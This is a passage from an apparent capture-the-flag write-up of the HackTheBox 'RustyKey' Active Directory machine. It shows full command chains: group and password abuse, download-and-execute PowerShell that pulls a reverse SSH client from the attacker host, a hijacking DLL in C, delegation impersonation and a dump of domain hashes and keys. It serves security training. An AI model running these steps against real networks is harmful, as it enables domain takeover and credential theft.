### DACL Abuse - Add IT-Computer3$ to Helpdesk group (AddSelf)

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache="$(pt get ticket)" add groupMember 'Helpdesk' 'IT-Computer3$'
[+] IT-Computer3$ added to Helpdesk
```

Request a new TGT to update membership info

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"; pt set ticket $(realpath "$(pt get user)".ccache)
Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in IT-Computer3$.ccache
```


### (Failed) DACL Abuse - Targeted kerberoasting

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME="$(pt get ticket)" python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -o targetedroastables.txt -v --dc-host "$(pt get dc_fqdn)" -d "$(pt get domain)" -k --no-pass
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (dd.ali)
[+] Writing hash to file for (dd.ali)
[VERBOSE] SPN removed successfully for (dd.ali)

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ hashcat targetedroastables.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
[...]

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ hashcat targetedroastables.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
[...]
```


### DACL Abuse - Force Change Password

Bulk change password of users in `REMOTE MANAGEMENT USERS` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli members 'REMOTE MANAGEMENT USERS@RUSTYKEY.HTB' -i | awk -F@ '{print $1}' | while read -r u; do bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache='IT-Computer3$.ccache' set password "$u" 'Bravosec1337!'; done
[+] Password changed successfully!
[+] Password changed successfully!
[+] Password changed successfully!
```


### (Failed) Protected users - Workaround

We can't authenticate to the domain since users in `Protected Users` group can only get TGT via `AES`

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ getTGT.py -dc-ip 10.10.11.75 "rustykey.htb"/'bb.morgan':'Bravosec1337!'
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```

> **Setup the tool to generate **aes** key**
> 
> 
> ```bash
> cd /opt/sectools/ad/
> git clone https://github.com/Tw1sm/aesKrbKeyGen.git
> cd aesKrbKeyGen
> uv add --script aesKrbKeyGen.py -r requirements.txt
> git commit -am "uv env setup"
> ```
{: .prompt-info }

Derive the password with **AES** keys

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ uv run /opt/sectools/ad/aesKrbKeyGen/aesKrbKeyGen.py -domain 'rustykey.htb' -u 'bb.morgan' -p 'Bravosec1337!'
[*] Salt: RUSTYKEY.HTBbb.morgan

[+] AES256 Key: 79AD142C5328D1D13B1436746F712F6D11364CB04A9A590FCCDE02DE0E3ECD3A
[+] AES128 Key: 64867A1434D2F7B361A408F034B79B2C
```

Unfortunately, the domain doesn't allow **AES** algorithms for kerberos

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ getTGT.py -dc-ip 10.10.11.75 "rustykey.htb"/'bb.morgan' -aesKey '79AD142C5328D1D13B1436746F712F6D11364CB04A9A590FCCDE02DE0E3ECD3A'
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)

┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ getTGT.py -dc-ip 10.10.11.75 "rustykey.htb"/'bb.morgan' -aesKey '64867A1434D2F7B361A408F034B79B2C'
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)
```


### DACL Abuse - Remove users from protected users group (Add Member)

Remove `Support` and `IT` group from `PROTECTED OBJECTS` group, so that the 3 users that have **WINRM** access will be removed from `Protected Users` group as well

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli members 'REMOTE MANAGEMENT USERS@RUSTYKEY.HTB' | awk -F@ '{print $1}' | while read -r g; do bloodyAD --host $(pt get rhost) -d $(pt get domain) -k ccache='IT-Computer3$.ccache' remove groupMember 'PROTECTED OBJECTS' "$g"; done
[-] IT removed from PROTECTED OBJECTS
[-] SUPPORT removed from PROTECTED OBJECTS
```


### 5985 - Winrm : Access spray

Bulk validate **winrm** access via **evil-winrm** since **netexec** only supports NTLM for **winrm** ( as of `2025/07`), found only `BB.MORGAN` has the access

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli members 'REMOTE MANAGEMENT USERS@RUSTYKEY.HTB' -i | awk -F@ '{print $1}' | while read -r u; do getTGT.py -dc-ip 10.10.11.75 'rustykey.htb'/"$u":'Bravosec1337!'; echo exit | KRB5CCNAME="$u.ccache" evil-winrm -r rustykey.htb -i dc.rustykey.htb; done | grep '>'
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> exit
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME="BB.MORGAN.ccache" evil-winrm -r rustykey.htb -i dc.rustykey.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> whoami
rustykey\bb.morgan
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cat ..\Desktop\user.txt
36b8aa83b16477d70b39cc7994f80950
```


# Root Flag
---

## Shell as ee.reed


### Reverse SSH - Interactive shell

> Run [reverse_ssh](https://github.com/NHAS/reverse_ssh) client with [logon type 9](https://learn.microsoft.com/windows-server/identity/securing-privileged-access/reference-tools-logon-types) via [RunasCs](https://github.com/antonioCoco/RunasCs) to gain access to **WMI** and utilize SSH features
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ cat <(echo '$RSSH_FP="C:\\programdata\\client.exe"; if (!(Test-Path -PathType Leaf $RSSH_FP)) { (new-object System.Net.WebClient).DownloadFile("http://LHOST/client.exe", $RSSH_FP); }; iex (new-object net.webclient).DownloadString("http://LHOST/Invoke-RunasCs.ps1"); Invoke-RunasCs -BypassUac -LogonType 9 -Username "x" -Password "x" -Command "$RSSH_FP"; exit' | sed "s/LHOST/$(pt get lhost)/g") - | KRB5CCNAME="BB.MORGAN.ccache" evil-winrm -r rustykey.htb -i dc.rustykey.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> $RSSH_FP="C:\programdata\client.exe"; if (!(Test-Path -PathType Leaf $RSSH_FP)) { (new-object System.Net.WebClient).DownloadFile("http://10.10.14.59/client.exe", $RSSH_FP); }; iex (new-object net.webclient).DownloadString("http://10.10.14.59/Invoke-RunasCs.ps1"); Invoke-RunasCs -BypassUac -LogonType 9 -Username "x" -Password "x" -Command "$RSSH_FP"; exit

2025/07/18 20:12:59 Forking
2025/07/18 20:12:59 Connecting to 10.10.14.59:443
*Evil-WinRM* PS C:\Users\bb.morgan\Documents>
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ ssh -J 127.0.0.1:443 rustykey.bb.morgan.dc
Warning: Permanently added 'rustykey.bb.morgan.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser


Name           : Microsoft Windows Server 2019 Standard|C:\Windows|\Device\Harddisk0\Partition4
Caption        : Microsoft Windows Server 2019 Standard
Description    :
CSName         : DC
Version        : 10.0.17763
BuildNumber    : 17763
OSArchitecture : 64-bit
SerialNumber   : 00429-00521-62775-AA474
RegisteredUser : Windows User
```

> **Example**
> 
> What it looks like without full access to **WMI**
> 
> ```powershell
> *Evil-WinRM* PS C:\Users\bb.morgan\Documents> Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser
> Access denied
> At line:1 char:1
> + Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -P ...
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>     + CategoryInfo          : PermissionDenied: (root\cimv2:Win32_OperatingSystem:String) [Get-CimInstance], CimException
>     + FullyQualifiedErrorId : HRESULT 0x80041003,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand
> ```
{: .prompt-danger }


### Winrm access spray

We can try to login as other users that we own via **runascs**

```bash
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Empire/situational_awareness/network/powerview.ps1'); iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Invoke-RunasCs.ps1')
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Invoke-RunasCs.ps1')
```

```bash
PS C:\Users\bb.morgan\Documents> iex (new-object net.webclient).DownloadString('http://10.10.14.106:80/Empire/situational_awareness/network/powerview.ps1'); iex (new-object net.webclient).DownloadString('http://10.10.14.106:80/Invoke-RunasCs.ps1')
PS C:\Users\bb.morgan\Documents> (Get-NetGroupMember -Recurse "remote management users" | ? MemberObjectClass -eq user).MemberName | % { echo "[*] $_"; Invoke-RunasCs -Username "$_" -Password "Bravosec1337!" -
Command "C:\programdata\client.exe" }
[*] ee.reed
[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

2025/11/08 18:47:55 Forking

[*] gg.anderson
[-] RunasCsException: LogonUser failed with error code: This user can't sign in because this account is currently disabled
[*] bb.morgan
[-] RunasCsException: Selected logon type '2' is not granted to the user 'bb.morgan'. Use available logon type '3'.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ ssh -J 127.0.0.1:443 unknown.dc
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
Error reading or writing history file 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt': Access to the path 'C:\Users\Default\AppData\Roaming\Microsoft\Windows\
PowerShell\PSReadLine' is denied.
umrustykey\ee.reed
```


## Shell as mm.turner

### DLL Hijack - COM server registry permissions

Run **PrivescCheck**

```bash
PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/PrivescCheck.ps1');Invoke-PrivescCheck -Risky
```

![](/assets/obsidian/93ddf542a890fc20a5c5ca124b72ca09.png)

- Members in `Support` group can hijack **7-zip shell extension** DLL

![](/assets/obsidian/fb574084a2c5f5d0db255855e7ba75af.png)

We can do a manual check on the **CLSID**

```bash
PS C:\Windows\system32> gp 'HKLM:\SOFTWARE\Classes\CLSID\{23170f69-40c1-278a-1000-000100020000}\InprocServer32'


(default)      : C:\Program Files\7-Zip\7-zip.dll
ThreadingModel : Apartment
PSPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170f69-40c1-278a-1000-000100020000}\InprocServer32
PSParentPath   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{23170f69-40c1-278a-1000-000100020000}
PSChildName    : InprocServer32
PSDrive        : HKLM
PSProvider     : Microsoft.PowerShell.Core\Registry

PS C:\Windows\system32> get-acl 'HKLM:\SOFTWARE\Classes\CLSID\{23170f69-40c1-278a-1000-000100020000}\InprocServer32' | fl AccessToString


AccessToString : APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
                 BUILTIN\Administrators Allow  FullControl
                 CREATOR OWNER Allow  FullControl
                 RUSTYKEY\Support Allow  FullControl
                 NT AUTHORITY\SYSTEM Allow  FullControl
                 BUILTIN\Administrators Allow  FullControl
                 BUILTIN\Users Allow  ReadKey
```

Found some user sessions on the machine via [Invoke-SessionHunter](https://github.com/Leo4j/Invoke-SessionHunter), which might load **shell extensions** by loading context menu from Windows Explorer (`explorer.exe`)

```bash
PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.59:80/Invoke-SessionHunter.ps1'); Invoke-SessionHunter -ShowAll -IncludeLocalHost

Domain       HostName IPAddress   OperatingSystem              Method   Access UserSession            AdmCount
------       -------- ---------   ---------------              ------   ------ -----------            --------
rustykey.htb dc       10.10.11.75 Windows Server 2019 Standard Registry   True RUSTYKEY\bb.morgan        False
rustykey.htb dc       10.10.11.75 Windows Server 2019 Standard Registry   True RUSTYKEY\mm.turner        False
rustykey.htb dc       10.10.11.75 Windows Server 2019 Standard Registry   True RUSTYKEY\Administrator     True


[+] Elapsed time: 0:0:0.791
```

Compile a DLL that will start **reverse SSH** client

> `rssh_dll.c`

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};

        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessA(
            NULL,                   // Application name (can be NULL if using command line)
            "C:\\programdata\\client.exe",        // Command line
            NULL, NULL,             // Process & thread security attributes
            FALSE,                  // Inherit handles
            CREATE_NO_WINDOW,       // Creation flags
            NULL, NULL,             // Environment, current directory
            &si, &pi                // Startup info, process info
        );

        // Optional: Close handles to avoid leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc -shared -o rssh.dll rssh_dll.c -luser32
```

Hijack the DLL into **7-zip's shell extension**

```bash
PS C:\Windows\system32> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.59:80/rssh.dll', '\programdata\rssh.dll')
PS C:\Windows\system32> sp 'HKLM:\SOFTWARE\Classes\CLSID\{23170f69-40c1-278a-1000-000100020000}\InprocServer32' -Name '(default)' -Value 'C:\programdata\rssh.dll'
```

By waiting for about 1 minute, we got a hit from `mm.turner`

![](/assets/obsidian/f1c5d5f27a5fc9bf9b4eb0e5d429f087.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ ssh -J 127.0.0.1:443 rustykey.mm.turner.dc
Warning: Permanently added 'rustykey.mm.turner.dc' (ED25519) to the list of known hosts.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows> whoami
rustykey\mm.turner
```


## Shell as backupadmin


### Resource-based constrained delegation

Configure **Resource-Based constrained delegation** for `IT-Computer$` on `IT-COMPUTER3$` (Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute)

```bash
PS C:\Windows> Set-ADComputer "DC$" -PrincipalsAllowedToDelegateToAccount 'CN=IT-COMPUTER3,OU=COMPUTERS,OU=IT,DC=RUSTYKEY,DC=HTB'
```

Since `Administrator` is sensitive and cannot be delegated, we will impersonate `backupadmin` instead

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ bhcli cypher "MATCH p = (b:Base)-[:MemberOf*1..]->(g:Group) WHERE b.sensitive = true OR g.objectid ENDS WITH '-525' RETURN p" | jq '.nodes[] | select(type=="object" and has("kind") and .kind=="User") | .properties.name' -r
EE.REED@RUSTYKEY.HTB
GG.ANDERSON@RUSTYKEY.HTB
BB.MORGAN@RUSTYKEY.HTB
ADMINISTRATOR@RUSTYKEY.HTB
```

Request a service ticket for `backupadmin` to access **cifs** (SMB) service on `dc.rustykey.htb`

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME='IT-Computer3$.ccache' getST.py -spn 'cifs/dc.rustykey.htb' -impersonate 'backupadmin' -dc-ip '10.10.11.75' 'rustykey.htb/IT-Computer3$' -k -no-pass
Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache
```

Get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME="backupadmin@cifs_dc.rustykey.htb@RUSTYKEY.HTB.ccache" wmiexec.py -k -shell-type powershell $(pt get rhost)
Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> whoami
rustykey\backupadmin

PS C:\> cat C:\users\administrator\desktop\root.txt
75a619c317234daa927e78a3bcdd80a3
```


# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/RustyKey]
└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump
Impacket v0.13.0.dev0+20250714.130102.b6ff7ac6 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
[*] DefaultPassword
RUSTYKEY\Administrator:Rustyrc4key#!
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
[*] NL$KM
 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
[*] Kerberos keys grabbed
Administrator:des-cbc-md5:e007705d897310cd
krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a
krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af
krbtgt:des-cbc-md5:d6d062fd1fd32a64
rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1
rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9
rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8
rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945
rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b
rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d
rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7
rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29
rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8
rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43
rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661
rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358
DC$:des-cbc-md5:915d9d52a762675d
Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc
Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203
Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9
Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828
Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616
Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d
Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954
Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1
Support-Computer3$:des-cbc-md5:c13edcfe4676f86d
Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e
Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047
Support-Computer4$:des-cbc-md5:3b79647680e0d57a
Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42
Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89
Support-Computer5$:des-cbc-md5:73abb53162d51fb3
Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918
Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea
Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df
Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703
Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78
Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c
Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d
Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466
Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba
Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f
Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951
Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49
Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de
Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc
Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd
IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e
IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676
IT-Computer1$:des-cbc-md5:019d29370ece8002
IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa
IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7
IT-Computer2$:des-cbc-md5:622f2ae961abe932
IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb
IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3
IT-Computer3$:des-cbc-md5:f7025180cd23e5f1
IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc
IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a
IT-Computer4$:des-cbc-md5:bf58cb437340cd3d
IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8
IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a
IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7
[*] Cleaning up...
[*] Stopping service RemoteRegistry
